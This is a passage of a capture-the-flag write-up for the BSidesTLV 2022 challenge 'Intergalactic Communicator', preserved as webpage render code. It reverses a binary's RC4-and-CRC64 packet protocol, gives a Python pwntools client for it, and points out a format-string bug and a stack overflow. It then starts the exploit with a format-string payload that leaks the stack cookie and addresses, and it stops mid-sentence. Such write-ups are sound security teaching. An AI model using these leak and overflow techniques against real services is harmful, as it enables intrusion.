class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M24 0v24H0V0h24Zm-3.077 3.077L7.067 3.076 16 12.816 10.369 19l-2.195-2.612 3.476-3.573-8.574-9.609v17.717h17.847V3.077Z" fill="currentColor" fill-rule="evenodd"></path></svg></a></div></div><div class="flex mb-2 space-x-2 text-sm text-gray-500 dark:text-gray-400"><a href="/">Project SEKAI</a><div> • </div><div>© 2024</div><div> • </div><div><a href="https://1a23.com">1A23 Studio</a></div></div><div class="mb-8 text-xs text-center text-gray-200 dark:text-gray-700">This website is in no way affiliated with any of the following individuals or organizations.<!-- --> <a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a> © Timothy Lim and contributors; <a target="_blank" rel="noopener noreferrer" href="https://pjsekai.sega.jp/">Project SEKAI: Colorful Stage! feat. Hatsune Miku</a> © SEGA / © Craft Egg Inc. Developed by Colorful Palette; <a target="_blank" rel="noopener noreferrer" href="https://ec.crypton.co.jp/pages/prod/virtualsinger">Character Vocal Series</a> © Crypton Future Media, INC. <a target="_blank" rel="noopener noreferrer" href="https://www.piapro.net">www.piapro.net</a> All rights reserved.</div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var r=Object.create;var c=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var d=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,u=Object.prototype.hasOwnProperty;var i=a=\u003ec(a,\"__esModule\",{value:!0});var m=(a,s)=\u003e()=\u003e(s||a((s={exports:{}}).exports,s),s.exports),k=(a,s)=\u003e{i(a);for(var t in s)c(a,t,{get:s[t],enumerable:!0})},N=(a,s,t)=\u003e{if(s\u0026\u0026typeof s==\"object\"||typeof s==\"function\")for(let e of d(s))!u.call(a,e)\u0026\u0026e!==\"default\"\u0026\u0026c(a,e,{get:()=\u003es[e],enumerable:!(t=p(s,e))||t.enumerable});return a},f=a=\u003eN(i(c(a!=null?r(h(a)):{},\"default\",a\u0026\u0026a.__esModule\u0026\u0026\"default\"in a?{get:()=\u003ea.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=m((v,l)=\u003e{l.exports=_jsx_runtime});var y={};k(y,{default:()=\u003eg,frontmatter:()=\u003eb});var n=f(o()),b={title:\"BSidesTLV 2022 CTF \\u2013 Intergalactic Communicator\",date:\"2022-06-30\",draft:!1,authors:[\"thebadgod\"],tags:[\"BSidesTLV 2022\",\"pwn\",\"reverse\",\"rc4\"],summary:\"pwn too easy, rev cancer.\",canonical:\"https://spclr.ch/bsidestlv2022-writeups\"};function w(a={}){let{wrapper:s}=a.components||{};return s?(0,n.jsx)(s,Object.assign({},a,{children:(0,n.jsx)(t,{})})):t();function t(){let e=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",p:\"p\",code:\"code\",h3:\"h3\",pre:\"pre\",ul:\"ul\",li:\"li\"},a.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(e.h2,{id:\"intergalactic-communicator-500\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#intergalactic-communicator-500\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Intergalactic Communicator (500)\"]}),`\n`,(0,n.jsxs)(e.p,{children:[`We get a tar gz archive with a docker container inside (An archived docker\ncontainer), the main thing inside we are interested in is the binary running\non the remote, so we either import the docker container or extract the layers\nuntil we find the binary in `,(0,n.jsx)(e.code,{children:\"/usr/src/app/main\"}),\".\"]}),`\n`,(0,n.jsxs)(e.h2,{id:\"part-1-reversing\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#part-1-reversing\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Part 1: Reversing\"]}),`\n`,(0,n.jsxs)(e.h3,{id:\"header--checksum\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#header--checksum\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Header \u0026 checksum\"]}),`\n`,(0,n.jsx)(e.p,{children:`The binary inside the docker container is statically compiled and stripped,\nso it must be a hard challenge (as it turns out it actually isn't, it's just\ncancerous).`}),`\n`,(0,n.jsxs)(e.p,{children:[`We start at the function start (entrypoint) inside the binary, this calls\n`,(0,n.jsx)(e.code,{children:\"libc_start_main\"}),`, where the first argument is the main function, going into\nthat we see that it runs an infinite loop and if it breaks it prints\n\"invalid packet\", making an educated guess and saying that that function\nprobably is `,(0,n.jsx)(e.code,{children:\"fwrite\"}),\", the next one after that probably is \",(0,n.jsx)(e.code,{children:\"exit\"}),`, then\nthere are only three more functions, the first of which looks like a memset\ncall, to set a buffer of size 2048 to zero, the second one looks like fread\n(Again looking at the arguments and seeing the stdin in fourth place).`]}),`\n`,(0,n.jsx)(e.p,{children:`So we read four bytes, put that into a variable, then swap the endianess\nof said variable, if that value is now less than 12 we print \"invalid\nprotocol header\", so we have 12 bytes of header data, next we read the\namount of bytes specified by our input. So this input must have been\nthe packet length, the rest of the data is the payload.`}),`\n`,(0,n.jsxs)(e.p,{children:[`This also means the last remaining function is the function responsible\nfor handling the packet data, it gets the packet data and its size.\nIn that function we load the first eight bytes of the data, xor it\nwith two different values and store those in a 16 byte buffer (The constants\nspell out `,(0,n.jsx)(e.code,{children:\"NotFlag!\"}),\" and \",(0,n.jsx)(e.code,{children:\"JustKey!\"}),` respectively, so I name the buffer key).\nnext we call a function where we give this buffer as first argument, then\nthe packet data (after the first eight bytes), then 16 and finally the packet\nlength minus eight. So we are entering the key and data and their sizes.`]}),`\n`,(0,n.jsx)(e.p,{children:`Looking at that function we see a few assertions (including file name, line\nnumber and function name \u0026 arguments), so we can already name all of those.\nIf you've ever reversed malware (or some \"secure\" c2 server), this encryption\nmight look familiar, as it is just doing rc4 encryption. It mallocs a new buffer\nfor the output and returns a pointer to that.`}),`\n`,(0,n.jsx)(e.p,{children:`Back in the function handling the packet we call memset on the packet data again,\nthen a function which takes the packet data pointer, the decrypted data pointer\nand the size of the data, so this is probably just a memcpy. Then we clear the\nallocated buffer and call free on it (Actually I didn't reverse that function, I\nagain just guessed it probably is free, since we don't use the buffer afterwards).`}),`\n`,(0,n.jsxs)(e.p,{children:[`Next we have an if which checks that the output of a function, which takes the\ndata and its size, is equal to the first eight bytes of the packet - which we\nused as the key for the decryption. If the check fails, we print \"checksum failed\"\nand exit, so this makes it pretty clear that we're using some sort of checksum.\nLooking at the function we see that there is a lookuptable. Googling the first\n(nonzero) constant in that table leads us to the crc64 implementation of\nredis which looks exactly like the implementation we got. So either we implement\nthis in python or we write the exploit in C and use this implementation...\nOr we just use pwntools `,(0,n.jsx)(e.code,{children:\"generic_crc\"}),` which will work the same as this implementation\nby just giving it the arguments which are defined at the top of the redis\nimplementation.`]}),`\n`,(0,n.jsxs)(e.p,{children:[`Next, if the checksum was correct, the packet data (without the checksum header)\nis passed into another function, which then first takes an int from the data\n(Finalizing the header) and performs a switch on the value of that, there\nare five actions we can perform, it seems that the first one just prints a\nnumber, so we change the function call with the format specified to `,(0,n.jsx)(e.code,{children:\"sprintf\"}),`,\nthe buffer we write into is used after the switch, first we put it into a\nfunction which returns an int, which we send to the other side using fwrite,\nthen we pass the buffer into a second function. This looks like we're just\nsending the size of the buffer and then the buffer, so I rename the functions\nto `,(0,n.jsx)(e.code,{children:\"strlen\"}),\" and \",(0,n.jsx)(e.code,{children:\"write_buffer\"}),\" and the buffer to \",(0,n.jsx)(e.code,{children:\"output_data\"}),` respectively.\n(I ignored the first if case in the function as it had to with futexes and\nthose are rarely important).`]}),`\n`,(0,n.jsxs)(e.h3,{id:\"api\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#api\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"API\"]}),`\n`,(0,n.jsx)(e.p,{children:`So now we know how to communicate (and we can already write a script to\ncommunicate which just sends packets and receives the answer), however\nthe interesting part starts now as we have to reverse the actual part\nwe can interact with, so let's look at the switch.`}),`\n`,(0,n.jsx)(e.p,{children:`The first case just returns a numberm which is the result of a function\ncall with an object which seems to be referenced a lot.`}),`\n`,(0,n.jsxs)(e.p,{children:[`The second case takes another int from the input data, puts it into\na function together with the weird object. Then we call a function\nwhich just dereferences the returned value. Venturing a bit into the\nfirst function we find the string `,(0,n.jsx)(e.code,{children:\"vector::_M_range_check\"}),`, which means\nthe object is likely just a vector and judging by the arguments this is\nprobably just the `,(0,n.jsx)(e.code,{children:\"operator[]\"}),`, the returned value is dereferenced, which\nleads me to believe that it's a c++ string and we called the `,(0,n.jsx)(e.code,{children:\"c_str\"}),` method\non it. Considering this, we now can make a guess about the first case in\nthe switch, that being it's just getting the size of the vector.\nNext we call `,(0,n.jsx)(e.code,{children:\"snprintf\"}),` (again based on the arguments), into a temporary\nbuffer, then we call some other method which again calls printf??\nYes as it looks like the temporary buffer is used as the format for\na printf to the output buffer... Well, if that's not handy...`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"The next case takes the rest of the buffer as a string (\",(0,n.jsx)(e.code,{children:\"char*\"}),`) and\ncalls another function with it, which probably means it's inserting\nthat into the list. Then we get the iterator and end iterator of that\nreturned string, then we clear the topmost bit of every char along the\nway (We iterate over all the chars we just put into the string)\nThis is likely to limit us to ascii-only values, but we'll see about that`]}),`\n`,(0,n.jsx)(e.p,{children:`The fourth case just calls a function and returns \"OK\", my guess was this\nclears the list and with a bit of experimenting that seemed to be the\ncase (not that I had to use this functionality)`}),`\n`,(0,n.jsx)(e.p,{children:`The last case is again using an iterator, this time over the string in the\nlist, and it just concatenates them all into a giant string, which is\non the stack... In a buffer of size 2048... Where every string can\nhave up to 2048 chars... So yeah, this could be used to overflow the stack\nquite a bit.`}),`\n`,(0,n.jsxs)(e.h3,{id:\"implementation\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#implementation\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Implementation\"]}),`\n`,(0,n.jsx)(e.p,{children:\"I implemented this protocol client in python:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" pwn \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" arc4 \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` ARC4\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"class\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"Comm\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    crc64 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"lambda\"}),\" x\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" crc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"generic_crc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"polynom\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0xad93d23594c935a9\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"width\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"64\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"refin\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"refout\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"xorout\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"init\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"data\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"x\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"__init__\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` r\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"send_packet\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        checksum \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" Comm\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"crc64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        key \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"checksum \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x2167616C46746F4E\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"checksum \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x2179654B7473754A\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        rc4 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ARC4\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"key\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        data \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" rc4\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encrypt\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        totransmit \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"len\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" endian\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"big\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"checksum\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),` data\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"totransmit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"recv_packet\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        length \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recvn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        data \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recvn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"length\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),` data\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"size\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"get\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" optional\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"None\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"not\"}),\" optional\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            optional \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'b\"\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" optional\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"clear\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"broadcast\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"send_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"p32\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" self\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv_packet\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:`To use this class you have to give it a pwntools pipe as constructor argument\nand then you can call the individual functions (Not that I only added\nthe optional packet data into the get method, but you could put that in\nall the methods, I only needed it in the get function)`}),`\n`,(0,n.jsxs)(e.h2,{id:\"part-2-pwn\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#part-2-pwn\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Part 2: Pwn\"]}),`\n`,(0,n.jsx)(e.p,{children:`The year is 2022 AD, Strings are entirely ascii. Well not entirely! One small\npart of memory still holds out against the ascii-fication.`}),`\n`,(0,n.jsx)(e.p,{children:`Well, first of all we want to leak data, like the aslr base and the stack\ncookie, as well as the stack address (We might not need it, but I mean, why not)`}),`\n`,(0,n.jsxs)(e.p,{children:[\"To do this we just add a string with the text \",(0,n.jsx)(e.code,{children:\"%529$p %533$p %532$p\"}),`, then\nprint that string using the get method. We get these numbers by taking the\nsize of the stack frame (0x1078), dividing that by eight and then adding six\n(The first six arguments are in registers, and on the stack every argument\nis eight bytes). That is the pointer to the saved return address, just before\nthat is the saved rbp, and for some reason 3 spaces further back is the stack\ncookie.`]}),`\n`,(0,n.jsx)(e.p,{children:`Now with these values we can 